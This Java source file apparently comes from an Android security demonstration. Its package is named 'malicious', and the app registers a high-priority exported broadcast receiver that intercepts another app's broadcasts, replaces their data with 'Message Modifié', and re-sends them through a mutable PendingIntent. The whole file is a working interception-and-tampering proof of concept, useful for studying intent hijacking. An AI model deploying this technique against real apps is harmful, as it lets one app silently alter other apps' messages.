package com.emptyPendingIntent.malicious;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    final ArrayList<String> list = new ArrayList<>();
    final BroadcastReceiver br = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {


            if(!intent.getStringExtra("Data").equals("Message Modifié")){

                list.add(LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH'h' mm'm' ss's'")) + ": Received and Modified");
                adapter.notifyDataSetChanged();

                intent.removeExtra("Data");
                intent.putExtra("Data","Message Modifié");

                SendIntent(intent);
            }
        }
    };
    private ArrayAdapter<String> adapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final ListView listView = findViewById(R.id.listview);
        IntentFilter filter = new IntentFilter("emptyPendingIntent.sender.send");
        filter.setPriority(250);

        registerReceiver(br, filter, RECEIVER_EXPORTED);


        adapter = new ArrayAdapter<String>(this, R.layout.simple_list_item, list);
        listView.setAdapter(adapter);

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(br);
    }

    private void SendIntent(Intent intent) {

        PendingIntent pending = PendingIntent.getBroadcast(MainActivity.this, 0, intent, PendingIntent.FLAG_CANCEL_CURRENT | PendingIntent.FLAG_MUTABLE);

        try {
            pending.send();
        } catch (PendingIntent.CanceledException e) {
            Toast.makeText(MainActivity.this, "Not worked", Toast.LENGTH_SHORT).show();
            throw new RuntimeException(e);
        }

    }
}